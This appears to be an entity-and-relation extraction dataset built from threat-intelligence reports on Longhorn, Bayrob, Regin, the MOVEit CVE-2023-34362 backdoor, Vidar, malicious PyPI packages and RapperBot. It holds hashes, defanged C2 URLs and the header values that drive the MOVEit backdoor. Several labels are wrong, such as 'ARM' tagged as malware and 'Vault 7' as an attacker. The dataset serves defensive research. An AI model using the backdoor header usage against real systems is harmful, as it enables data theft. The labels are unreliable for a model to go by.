{"instruction": "There are indications that Igor has been active for quite some time. Symantec first identified the use of Bachosens in 2014. However, the auto-tech company targeted by Igor issued an alert as far back as 2009 about its software being sold by an unauthorized reseller. Symantec was able to confirm links between the domains mentioned in this alert and Igor, indicating he has been active for almost 10 years. Symantec researchers\u2019 analysis of Igor\u2019s activities allowed us to gain an insight into his methods and areas of focus. Based on publicly available information, Symantec was able to find likely connections between Igor and an auto parts store located in Transnistria, a disputed territory in Moldova. His involvement in the automotive industry could explain why he showed an interest in targeting the auto-tech company.", "input": null, "output": "Named Entities: (Igor, attacker), (Bachosens, malware)\nRelationships: (Igor, use, Bachosens)"}
{"instruction": "Up until 2014, versions of Corentry were compiled using GCC. According to the Vault 7 document, Fluxwire switched to a MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015 had used MSVC as a compiler. Table. Corentry version numbers and compilation dates compared to Fluxwire version numbers and changelog dates disclosed in Vault 7 Corentry sample (MD5 hash) Date/time of sample compilation Embedded Corentry version number Corentry compiler Vault 7 changelog number Vault 7 changelog date N/A N/A N/A N/A 2.1.0 - 2.4.1 Jan 12, 2011 - Feb 28, 2013 e20d5255d8ab1ff5f157847d2f3ffb25 23/08/2013 10:20 3.0.0 GCC 3.0.0 Aug 23, 2013 5df76f1ad59e019e52862585d27f1de2 21/02/2014 11:07 3.1.0 GCC 3.1.0 Feb 20, 2014 318d8b61d642274dd0513c293e535b38 15/05/2014 09:01 3.1.1 GCC 3.1.1 May 14, 2014 N/A N/A N/A N/A 3.2.0 Jul 15, 2014 511a473e26e7f10947561ded8f73ffd0 03/09/2014 00:12 3.2.1 GCC 3.2.1 Aug 18, 2014", "input": null, "output": "Named Entities: (Corentry, malware), (e20d5255d8ab1ff5f157847d2f3ffb25, MD5), (5df76f1ad59e019e52862585d27f1de2, MD5), (318d8b61d642274dd0513c293e535b38, MD5), (511a473e26e7f10947561ded8f73ffd0, MD5)\nRelationships: (Corentry, sample, e20d5255d8ab1ff5f157847d2f3ffb25), (Corentry, sample, 5df76f1ad59e019e52862585d27f1de2), (Corentry, sample, 318d8b61d642274dd0513c293e535b38), (Corentry, sample, 511a473e26e7f10947561ded8f73ffd0)"}
{"instruction": "c06d422656ca69827f63802667723932 25/02/2015 16:50 N/A MSVC 3.3.0 Feb 25, 2015 N/A N/A N/A N/A 3.3.1 -> 3.5.0 May 17, 2015 -> Nov 13, 2015 A second Vault 7 document details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel. The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called Backdoor.Plexor. A third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks, key exchange once per connection, and use of AES with a 32-byte key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools.", "input": null, "output": "Named Entities: (Archangel, tool), (Longhorn, tool), (Backdoor.Plexor, malware)\nRelationships: (Archangel, closely matched, Longhorn), (Longhorn, called, Backdoor.Plexor)"}
{"instruction": "Distinctive fingerprints \nLonghorn has used advanced malware tools and zero-day vulnerabilities to infiltrate a string of targets worldwide. Taken in combination, the tools, techniques, and procedures employed by Longhorn are distinctive and unique to this group, leaving little doubt about its link to Vault 7. \nThroughout its investigation of Longhorn, Symantec\u2019s priority has been the protection of its customers. Through identifying different strains of Longhorn malware, connecting them to a single actor, and learning more about the group\u2019s tactics and procedures, Symantec has been able to better defend customer organizations against this and similar threats. In publishing this new information, Symantec\u2019s goal remains unchanged: to reassure customers that it is aware of this threat and actively working to protect them from it.", "input": null, "output": "Named Entities: (Longhorn, tool), (Vault 7, attacker)\nRelationships: (Longhorn, link to, Vault 7)"}
{"instruction": "Bayrob: Three suspects extradited to face charges in US", "input": null, "output": "No related entities and relations."}
{"instruction": "Fraud operation conned victims out of millions of dollars. Three Romanian men have been indicted in the US for allegedly operating a longstanding fraud operation known as Bayrob that conned victims out of millions of dollars. Bogdan Nicolescu (aka \u201cMasterfraud\u201d, aka \u201cmf\u201d); Danet Tiberiu (aka \u201cAmightysa\u201d, aka \u201camy\u201d); and Radu Miclaus (aka \u201cMinolta\u201d, aka \u201cmin\u201d) were arrested by police in Romania earlier this year before being extradited to the US, where they now face multiple charges relating to fraud, identity theft, money laundering, and trafficking in counterfeit goods or services. Our research shows that the Bayrob gang are career cybercriminals, earning a living from online fraud. They specialize in detailed scams and go to great lengths to craft convincing emails and create fake websites, voice messages, and even customer support chatrooms in order to dupe victims.", "input": null, "output": "No related entities and relations."}
{"instruction": "The gang began its career running elaborate cons where it created fake vehicle auctions to defraud victims out of tens of thousands of dollars. It later expanded and diversified with a number of different fraud and malware operations, ranging from credit card theft to cryptocurrency mining using infected computers. The FBI believes that the Bayrob group has stolen at least US$4 million from victims over the past eight years, though the actual total may be up to $35 million. It also established that the group infected between 60,000 and 160,000 computers and sent out 11 million malicious emails. The arrests are the culmination of an eight-year law enforcement investigation which was assisted by Symantec. During this time, Symantec discovered multiple versions of Bayrob malware, collected helpful intelligence data, and witnessed Bayrob as it morphed from online fraud to a 300,000+ botnet for cryptocurrency mining.", "input": null, "output": "No related entities and relations."}
{"instruction": "Further information \nSymantec has gathered full technical details and indicators of compromise for all Bayrob malware variants discovered since 2007. This can be supplied to any member of the information security community upon request.", "input": null, "output": "No related entities and relations."}
{"instruction": "Carefully planned operation \nThe attackers appear to have done a significant amount of preparatory work for the operation. The malware was configured with passwords that appear to have been stolen from the targeted organizations and were likely used to allow the threat to spread across a targeted organization\u2019s network. How the attackers obtained the stolen credentials is unknown. \nThe malware had a default configuration that triggered the disk-wiping payload at 8:45pm local time on Thursday, November 17. The Saudi Arabian working week runs from Sunday to Thursday. It would appear that the attack was timed to occur after most staff had gone home for the weekend in the hope of reducing the chance of discovery before maximum damage could be caused.", "input": null, "output": "No related entities and relations."}
{"instruction": "BarTender Enterprise Automation (label and barcode creation software) HDClone (hard disk cloning utility) Siemans SIMATIC STEP 7 (industrial automation software) CadSoft Eagle Professional (printed circuit board design software) PremiumSoft Navicat Premium (database administration software) Originlab Originpro (data analysis and graphing software) Manctl Skanect (3D scanning software) Symantec System Recovery (backup and data recovery software; now part of Veritas) The product keys downloaded from these websites do not work and simply generate pseudo-random sequence of characters. This means all the victim gets from the download is a junk file and a potential Gatak infection.", "input": null, "output": "No related entities and relations."}
{"instruction": "Malware tools \nThe Gatak Trojan (aka Stegoloader) has been used in attacks since at least 2011. There are two main components of the malware. A lightweight deployment module (Trojan.Gatak.B) can perform detailed system fingerprinting on infected computers and selectively install additional payloads. The main module (Trojan.Gatak) is a fully fledged back door Trojan, which maintains a persistent presence on an infected computer and steals information from it. \nA notable feature of Gatak is its use of steganography, a technique for hiding data within image files. When Gatak is installed on a computer, it attempts to download a PNG image file from one of a number of URLs hardcoded into the malware. The image looks like an ordinary photograph, but contains an encrypted message within its pixel data. The Gatak Trojan is capable of decrypting this message, which contains commands and files for execution.", "input": null, "output": "Named Entities: (Gatak Trojan, malware), (Stegoloader, malware), (backdoor Trojan, threat type)\nRelationships: (Gatak Trojan, aka, Stegoloader), (Gatak Trojan, belong to, backdoor Trojan)"}
{"instruction": "Recent attacks \nSymantec discovered the most recent wave of Tick attacks in July 2015, when the group compromised three different Japanese websites with a Flash (.swf) exploit to mount watering hole attacks. Visitors to these websites were infected with a downloader known as Gofarer (Downloader.Gofarer). Gofarer collects information about the compromised computer\u00a0and then downloads and installs Daserf. \nTick also used spear-phishing emails in these recent attacks. While Symantec did not find the emails themselves, it did identify the use of an exploit designed to take advantage of a vulnerability in Microsoft Office documents ( CVE-2014-4114 ). This was used to distribute malware in addition to the watering hole activity.", "input": null, "output": "Named Entities: (Tick, attacker), (Downloader.Gofarer, malware), (Daserf, malware), (CVE-2014-4114, vulnerability)\nRelationships: (Tick, mount, watering hole attack), (Tick, use, Downloader.Gofarer), (Downloader.Gofarer, install, Daserf), (Tick, take advantage of, CVE-2014-4114)"}
{"instruction": "Background \nOur investigation began when we received three file hashes, which we determined to have the functionality of a back door with information-stealing capabilities. The malware appeared to be new, rarely detected, and not publicly available. As we analyzed the binary and compared it against other known back door Trojans, we realized this was custom-developed malware. \nDeveloping a back door with information-stealing capabilities designed to evade detection requires both knowledge and funding. Usually when we see a new back door Trojan like this, it is tied to organizations involved in cyberespionage campaigns.", "input": null, "output": "No related entities and relations."}
{"instruction": "Table 1 . Commands associated with the Dripion malware Additionally, the developer of the Dripion malware used XOR encoding for both the binary configuration file (XOR: 0xA8) as well as network requests with the C&C server (XOR: 0xA3), to make detection more difficult. Dripion has been identified in multiple variations and has version numbers hardcoded within the malware. This indicates that the attackers have the ability to both create and develop their own custom malware as well as update their code to provide new capabilities and make detection more difficult.", "input": null, "output": "Named Entities: (Dripio, malware), (C&C server, tool)\nRelationships: (Dripio, use, C&C server)"}
{"instruction": "Mitigation advice \nAlways keep your security software up to date to protect yourself against any new variants of this malware. \nKeep your operating system and other software updated. Software updates will frequently include patches for newly discovered security vulnerabilities which are frequently exploited by attackers. \nDelete any suspicious-looking emails you receive, especially if they contain links or attachments. Spear phishing emails are frequently used by cyberespionage attackers as a means of luring victims into opening malicious files.", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec telemetry has confirmed a virtual cessation of the group\u2019s activities. \nThe cybercrime group controlling the Dyre financial fraud Trojan appears to have suffered a major blow following a Russian law enforcement operation in November . Symantec telemetry has confirmed a virtual cessation of the group\u2019s activities. Dyre (detected by Symantec as\u00a0Infostealer.Dyre) is spread through email spam campaigns and no Dyre-related spam campaigns have been observed since November 18. Detections of the Dyre Trojan and associated malware have also dropped dramatically since mid-November.", "input": null, "output": "Named Entities: (Dyre, malware), (financial fraud Trojan, threat type)\nRelationships: (Dyre, belong to, financial fraud Trojan)"}
{"instruction": "Group operates at a much higher level than the average cybercrime gang. Note: \u201cMorpho\u201d was used in the original publication to refer to this attack group. Symantec has renamed the group \u201cButterfly\u201d to avoid any link whatsoever to other legitimate corporate entities named \u201cMorpho\u201d A corporate espionage group has compromised a string of major corporations over the past three years in order to steal confidential information and intellectual property. The gang, which Symantec calls Butterfly, is not-state sponsored, rather financially motivated. It has attacked multi-billion dollar companies operating in the internet, IT software, pharmaceutical, and commodities sectors. Twitter, Facebook, Apple, and Microsoft are among the companies who have publicly acknowledged attacks.", "input": null, "output": "Named Entities: (Butterfly, attacker), (Morpho, attacker)\nRelationships: (Morpho, renamed, Butterfly)"}
{"instruction": "Gateway to other threats \nDyre is also used to infect victims with further malware and Symantec has to date seen seven other malware families being pushed out to infected computers. In many cases, the victim is added to a botnet, which is then used to power further spam campaigns and infect more victims.", "input": null, "output": "Named Entities: (Dyre, malware)\nRelationships: (Dyre, use, botnet)"}
{"instruction": "Stealth \nRegin\u2019s developers put considerable effort into making it highly inconspicuous. Its low key nature means it can potentially be used in espionage campaigns lasting several years. Even when its presence is detected, it is very difficult to ascertain what it is doing. Symantec was only able to analyze the payloads after it decrypted sample files. \nIt has several \u201cstealth\u201d features. These include anti-forensics capabilities, a custom-built encrypted virtual file system (EVFS), and alternative encryption in the form of a variant of RC5, which isn\u2019t commonly used. Regin uses multiple sophisticated means to covertly communicate with the attacker including via ICMP/ping, embedding commands in HTTP cookies, and custom TCP and UDP protocols.", "input": null, "output": "Named Entities: (Regin, malware)\nRelationships: No related relations."}
{"instruction": "Conclusions \nRegin is a highly-complex threat which has been used in systematic data collection or intelligence gathering campaigns. The development and operation of this malware would have required a significant investment of time and resources, indicating that a nation state is responsible. Its design makes it highly suited for persistent, long term surveillance operations against targets. \nThe discovery of Regin highlights how significant investments continue to be made into the development of tools for use in intelligence gathering. Symantec believes that many components of Regin remain undiscovered and additional functionality and versions may exist.\u00a0 Additional analysis continues and Symantec will post any updates on future discoveries", "input": null, "output": "Named Entities: (Regin, malware)\nRelationships: No related relations."}
{"instruction": "Attack group targeted energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers. An ongoing cyberespionage campaign against a range of targets, mainly in the energy sector, gave attackers the ability to mount sabotage operations against their victims. The attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to energy supplies in affected countries. Among the targets of Dragonfly were energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers. The majority of the victims were located in the United States, Spain, France, Italy, Germany, Turkey, and Poland.", "input": null, "output": "Named Entities: (Dragonfly, attacker)\nRelationships: No related relations."}
{"instruction": "While another variant (5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796), compiled on Thu May 25 11:02:54 2023 GMT, gathered the same type of data, the main difference was with encoding. Instead of plaintext, the data it collected was encoded in hex. Over the past couple of months, we also spotted some variants that used internal IP addresses 10[.]10[.]30[.]36 in SHA256: 2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F and 192[.]168[.]21[.]182 in SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) instead of an actual C2 server. This was perhaps due to testing new features and/or checking for AV detections. Conclusion", "input": null, "output": "Named Entities: (5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796, SHA256), (10[.]10[.]30[.]36, IP), (2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F, SHA256), (192[.]168[.]21[.]182, IP), (847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337, SHA256)\nRelationships: (10[.]10[.]30[.]36, in, 2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F), (192[.]168[.]21[.]182, in, 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337)"}
{"instruction": "The malware we analyzed posed as a legitimate app for an electronic toll system used in Southern Asia. It lures the victim into entering his/her credentials, steals them, and also steals 2FA (two-factor authentication) codes by listening to incoming SMS and forwarding them to a website controlled by the attackers.", "input": null, "output": "No related entities and relations."}
{"instruction": "The Telegram channel was started in May 2022, and the threat actor has been monetizing its botnet by providing DDoS-as-a-service and selling the malware source code (Figure 2).", "input": null, "output": "No related entities and relations."}
{"instruction": "We provide a technical analysis of the ARM malware sample 509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084 in the following sections: Killing off the Competition This malware employs several techniques to keep itself running in an infected system. At the same time, it also prevents infections from other botnets by attempting to terminate their processes. Typical to Mirai-based botnets, this malware cannot survive a system reboot. Because of this, it deletes the following binaries used to shut down or reboot the system. /usr/sbin/reboot /usr/bin/reboot /usr/sbin/shutdown /usr/bin/shutdown /usr/sbin/poweroff /usr/bin/poweroff /usr/sbin/halt /usr/bin/halt It also reads the /proc/<PID>/status for each running process and compares the Name field to the following strings to kill any processes with matching names: /bin/busybox /bin/systemd /usr/bin test /tmp/condi /tmp/zxcr9999 /tmp/condinetwork /var/condibot /var/zxcr9999 /var/CondiBot /var/condinet /bin/watchdog", "input": null, "output": "Named Entities: (ARM, malware), (509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084, SHA256)\nRelationships: (ARM, sample, 509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084)"}
{"instruction": "Once it receives the \\x33\\x66\\x66 command used to start the webserver, this malware downloads bot binaries from a hardcoded IP and port. After that, it starts a basic HTTP server on a random port number above 1024 to host these binaries. GET, POST, and HEAD requests to this server for the /arm, /arm7, /mips, /mipsel, /x86_64, /sh4, /ppc, and /m68k URLs will serve these binaries if they were downloaded previously. This HTTP server masquerades as a legitimate Apache HTTP server by responding with the \u201cServer: Apache\u201d header when any URLs are requested. From then on, the threat actor can issue the \\x33\\x66\\x33 command to download the latest binaries from the same hardcoded IP and port so that the webserver serves the most updated version of the malware.", "input": null, "output": "No related entities and relations."}
{"instruction": "FortiGuard Labs recently came across a new ransomware variant called Big Head, which came out in May 2023. Although there are at least three variants of Big Head ransomware, all are designed to encrypt files on victims\u2019 machines to extort money, like other ransomware variants. Infection Vector One Big Head ransomware variant displays a fake Windows Update, potentially indicating that the ransomware was also distributed as a fake Windows Update. One of the variants has a Microsoft Word icon and was likely distributed as counterfeit software. At the time of this research, there is no indication that Big Head is widespread. Ransomware Execution FortiGuard Labs is aware of at least two variants of Big Head ransomware, which we have named variants A and B. Variant A", "input": null, "output": "Named Entities: (Big Head, malware), (ransomware, threat type)\nRelationships: (Big Head, belong to, ransomware)"}
{"instruction": "Affected Platforms: All unpatched MOVEit Transfer versions running a SQL database Impacted Users: Any organization that uses a vulnerable version of MOVEit Transfer Impact: Remote attackers can install a backdoor and exfiltrate data Severity Level: High FortiGuard Labs is aware of a critical zero-day SQL injection vulnerability in the MOVEit Secure Managed File Transfer software (CVE-2023-34362) allegedly exploited by the Cl0p ransomware threat actor. High-profile government, finance, media, aviation, and healthcare organizations have reportedly been affected, with data exfiltrated and stolen. Due to its severity, CISA released an advisory for the vulnerability on June 1st, 2023. They also updated the Known Exploited Vulnerabilities catalog on June 2nd with CVE-2023-34362. This blog contains information on what you need to know about CVE-2023-34362. For further details, please see the related FortiGuard Labs Outbreak Alert. What is MOVEit Transfer?", "input": null, "output": "Named Entities: (CVE-2023-34362, vulnerability), (Cl0p, attacker)\nRelationships: (CVE-2023-34362, exploited by, Cl0p)"}
{"instruction": "MOVEit Transfer is a commercial secure managed file transfer (MFT) software solution that enables the secure movement of files between organizations and their customers using SFTP, SCP, and HTTP-based uploads. What is CVE-2023-34362? MOVEit Transfer is vulnerable to a SQL injection vulnerability that could allow an unauthenticated attacker to access MOVEit Transfer's database. Structured Query Language (SQL) allows queries and commands to be executed against a relational database. An injection vulnerability allows an attacker to manipulate one of these queries to exploit a system to retrieve data or make changes.", "input": null, "output": "Named Entities: (CVE-2023-34362, vulnerability), (MOVEit Transfer, tool)\nRelationships: (CVE-2023-34362, infect, MOVEit Transfer)"}
{"instruction": "X-siLock-Comment: [password] X-siLock-Step1: -1 If \"-1\" is sent with an \"X-siLock-Step1\" header, the backdoor list files in the database. The file listing also includes file metadata. It tries to include the file's id, name, and size. It also tries to display the file's location (folder path) and which user owns/uploaded the file. The listing also tries to include which institution the file is associated with. 3. Create a new service account. The HTTP request headers should include the following: X-siLock-Comment: [password] X-siLock-Step1: [arbitrary institution id]", "input": null, "output": "No related entities and relations."}
{"instruction": "Affected Platforms: Windows Impacted Users: Any organization Impact: Remote attackers steal credentials, sensitive information, and cryptocurrency and perform cryptojacking on systems Severity Level: Critical FortiGuard Labs came across an ongoing threat campaign targeting YouTube viewers searching for pirated software earlier this month. Videos advertising downloads of \u201ccracked\u201d (aka pirated) software are uploaded by verified YouTube channels with a large number of subscribers. Victims are led to execute malicious binaries that install multiple malware into their systems focused on harvesting credentials, cryptojacking, and stealing cryptocurrency funds from wallets. While investigating this campaign, other researchers published a report about it. And although there are overlaps with our findings, this report provides additional observations, such as the deployment of a third malware family being distributed to the victims. This article describes the entire attack chain and technical details on the malware components that make up this campaign. YouTube Videos Offering Cracked Software", "input": null, "output": "No related entities and relations."}
{"instruction": "As shown in Figure 5, after downloading the RAR archive 2O23-F1LES-S0ft.rar via the URL provided in the YouTube video description, the victim must uncompress the archive with the password \u201c1212,\u201d listed together with the URL, and run the Launcher_S0FT-2O23.exe contained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exe - Vidar Stealer Launcher_S0FT-2O23.exe is the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c (original) and e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb (after removing excess bytes).", "input": null, "output": "Named Entities: (Launcher_S0FT-2O23.exe, file), (Vidar Stealer, malware), (820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c, SHA256), (e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb, SHA256)\nRelationships: (Launcher_S0FT-2O23.exe, is, Vidar Stealer), (Launcher_S0FT-2O23.exe, hash of this file, 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c), (Launcher_S0FT-2O23.exe, hash of this file, e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb)"}
{"instruction": "The C2 server then responds with a list of secondary payloads for the malware to download and execute (Figure 10). This sample downloads files stored as releases in GitHub repositories owned by the user jesus061031r. Similar malicious files with different filenames are scattered among other repositories owned by the same user.", "input": null, "output": "No related entities and relations."}
{"instruction": "Vaxa.exe - Miner Installer Vaxa.exe (SHA256: 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a .NET assembly named Task32Main (SHA256: 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main \u2013 Miner Downloader Task32Main is a .NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system.", "input": null, "output": "Named Entities: (Vaxa.exe, file), (Miner Installer, malware), (44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f, SHA256), (shellcode, tool), (Task32Main, malware), (5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3, SHA256), (Regsvcs.exe, file), (watchdog, tool)\nRelationships: (Vaxa.exe, is, Miner Installer), (Vaxa.exe, hash, 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f), (Vaxa.exe, decrypt, shellcode), (shellcode, inject, Task32Main), (Task32Main, hash, 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3), (Task32Main, within, Regsvcs.exe), (Task32Main, installing, watchdog)"}
{"instruction": "Based on the information we have collected so far, we now believe that this driver has been active in the wild since at least mid-2020 and, to the best of our knowledge, has not been reported before. Observed telemetry shows that 65% of the lookups for this driver were from Saudi Arabia, indicating it was a primary target. This same telemetry shows a considerable increase in the number of lookups for this driver in August and September 2022 and again in February and March 2023. This may indicate that the actor(s) behind this driver was operating major campaigns on these dates.", "input": null, "output": "No related entities and relations."}
{"instruction": "Injected Shellcode Fortunately, the embedded shellcode can be dumped from Wintapix.sys and analyzed separately. It quickly revealed that the shellcode was created using the Donut project. Donut allows you to convert any .NET assembly or shellcode file into position-independent shellcode, which can then be injected into a target process using techniques like process hollowing or thread hijacking. The generated shellcode is self-contained and does not rely on any external dependencies. This means that the primary goal in our analysis should be to extract the next attack stage, which should be a .NET assembly. The .NET payload can be extracted from the Donut shellcode by identifying and breaking the decryption function in a debugger. After decryption runs, the .NET assembly can be dumped from memory. .NET Payload", "input": null, "output": "Named Entities: (Wintapix.sys, malware), (Donut, tool)\nRelationships: (Wintapix.sys, use, Donut)"}
{"instruction": "The FortiGuard Labs team discovered over 30 new zero-day attacks in PyPI packages (Python Package Index). These were found between late March and late April by monitoring an open-source ecosystem. In this blog, we will cover all the packages that were found, grouping them into similar attacks or behavior. Some of these sets may have been shown in a previous blog. 1. The packages in the following set were found to be similar: tls-bypass (version 1.0) zproxy (version 1.0) stripe-client (version 1.0) stripepy (version 1.0) proxycpz (version 1.0) pycolorstrex (version 1.0) pyproxyx (version 1.0) colored-fidget (version 1.0) As explained in our last blog, the setup.py file in these packages tries to execute a Python script written to connect to a URL that may contain malicious code. 2. The next set of packages includes: ailzyn1tr0 (version 1.0) oauth20-api (version 1.0) bogdi (version 1.0)", "input": null, "output": "No related entities and relations."}
{"instruction": "The setup.py file in these packages tries to steal information, such as credit cards, wallets, account logins, etc. using a Discord webhook. 3. This set includes the following package: async-box (version 1.4.7) The setup.py file in this package tries to download a zip file to a directory (depending on the Python version), extract its contents, run a script contained in the zip file, and then remove its directory. 4. This set includes the following package: seleniumunclickable (version 1.0.1) The setup.py file in this package connects to a URL to download and run a potentially malicious script. 5. This set includes the following package:", "input": null, "output": "No related entities and relations."}
{"instruction": "aietelegram (version 0.3)\nsocial-scapper (version 3.6)\nquick-telegram-sender (version 0.7)\nlibidreq (version 0.1)\nsetnetwork (version 0.3)\ntg-bulk-sender (version 2.3)\nsocial-scrappers (version 2.3)\ntiktok-phone-cheker (version 2.42)\ncloud-client (version 1.34)\ncloudfix (versions 0.0.0, 2)\nWhen examining its setup.py, we found that it tries to run the encoded data shown below. Once decoded, we see that it creates and runs an executable file that accesses and exfiltrates sensitive data.", "input": null, "output": "No related entities and relations."}
{"instruction": "8.\u00a0\u00a0\u00a0\u00a0 This set includes the following package:", "input": null, "output": "No related entities and relations."}
{"instruction": "9.\u00a0\u00a0\u00a0\u00a0 This set includes the following package:\npycalculate (version 1.0.0)\nThis package contains multiple layers of obfuscation in its setup.py file, as shown in Figure 12. While it could not fully run, it still dropped a script named \u2018WindowsDefender.py,\u2019 which provides clues that it will execute a potentially malicious script that it retrieved from a file-sharing website, as shown in Figure 13.", "input": null, "output": "No related entities and relations."}
{"instruction": "Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level: Critical FortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs reported on its previous campaigns in August 2022 and December 2022. Those campaigns focused on brute-forcing devices with weak or default SSH or Telnet credentials to expand the botnet\u2019s footprint for launching Distributed Denial of Service (DDoS) attacks. In this campaign, these threat actors have started venturing into cryptojacking, specifically for Intel x64 machines. Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in late January 2023, they combined both functionalities into a single bot.", "input": null, "output": "Named Entities: (RapperBot, malware), (Distributed Denial of Service (DDoS) attack, threat type)\nRelationships: No related relations."}
{"instruction": "7. Total memory size 8. Open File Limit 9. Hostname 10. Processor model After that, it sends a keep-alive request (type 3) to inform the C2 server that it is ready to receive commands. The malware then performs this request at random intervals of 60 to 600 seconds. To evade detection, the binary network protocol used to send these requests has been completely revised. Like its string encoding, it uses a two-layer approach to encode the information sent to the C2 server. The header data must first be decoded to reveal the location of the encoded information and the key needed to decode it.", "input": null, "output": "No related entities and relations."}
{"instruction": "The size of each request is randomized, so shorter requests do not stand out in network traffic. The malware starts by generating a random number between 4 and 128, which we will refer to as RAND_VALUE, and a random XOR key for the content from 4 to 32 bytes long (referred to as KEY_SIZE). The request size is then calculated as follows: REQUEST_SIZE = RAND_VALUE + KEY_SIZE + CONTENT_SIZE + 6 The malware then generates a buffer of the same size and fills it with random bytes. The first byte of this buffer will be used as a XOR key (HEADER_KEY) for encoding the header data. The second byte will be overwritten with the RAND_VALUE XORed with the HEADER_KEY. The request data is stored at HEADER_OFFSET, RAND_VALUE / 2. The format of the structure starting at HEADER_OFFSET is as follows: Offset 0x2: ENC_REQ_TYPE (Request type xor HEADER_KEY)", "input": null, "output": "No related entities and relations."}
{"instruction": "We observed that hxxp://109[.]206[.]243[.]207/ssh/x86_64 started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash: 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash: 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4.", "input": null, "output": "Named Entities: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, URL), (RapperBot, malware), (Bash scripts, tool), (7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f, SHA256), (XMRig crypto miner, tool), (0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404, SHA256)\nRelationships: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, servering, Bash scripts), (RapperBot, use, Bash scripts), (Bash scripts, hash, 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f), (Bash scripts, download, XMRig crypto miner), (XMRig crypto miner, hash, 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404)"}
{"instruction": "XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 sample f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Mining Under the Radar", "input": null, "output": "Named Entities: (XMRig, malware), (cryptojacking, threat type), (f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, SHA256), (RapperBot, malware)\nRelationships: (XMRig, for, cryptojacking), (XMRig, hash, f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa), (XMRig, merged, RapperBot)"}
